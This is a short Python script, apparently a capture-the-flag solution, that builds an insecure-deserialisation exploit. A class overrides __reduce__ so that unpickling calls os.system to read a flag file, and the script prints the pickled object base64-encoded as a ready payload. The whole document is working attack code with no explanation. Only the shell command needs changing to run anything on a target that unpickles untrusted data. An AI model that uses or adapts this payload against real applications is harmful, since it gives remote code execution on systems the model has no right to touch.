import pickle
import base64
import os

# Class to run the command when unpickled
class GetFlag:
    def __reduce__(self):
        return (os.system, ('cat /flag.bK9fLMvHycoW486MqWdn.txt',))

# Create the malicious object
obj = GetFlag()
# Pickle the object
pickled_data = pickle.dumps(obj)

# Base64 encode the pickled data
encoded_data = base64.b64encode(pickled_data).decode()

print(encoded_data)